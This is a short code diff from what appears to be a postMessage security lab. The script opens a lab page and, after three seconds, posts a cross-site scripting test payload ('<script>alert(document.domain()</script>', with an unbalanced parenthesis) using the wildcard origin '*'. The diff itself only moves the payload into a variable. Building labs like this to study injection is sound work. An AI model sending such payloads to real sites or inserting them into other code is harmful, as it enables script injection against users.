@@ -11,9 +11,10 @@
         //     console.log(message.data);
         // });
         myWindow = window.open("https://ac13.netlify.app/postmsg_lab");
+        let payload = "<script>alert(document.domain()</script>";
 
         function postMsg() {
-            myWindow.postMessage("<script>alert(document.domain()</script>", "*");
+            myWindow.postMessage(payload, "*");
         }
 
         setTimeout(postMsg, 3000);
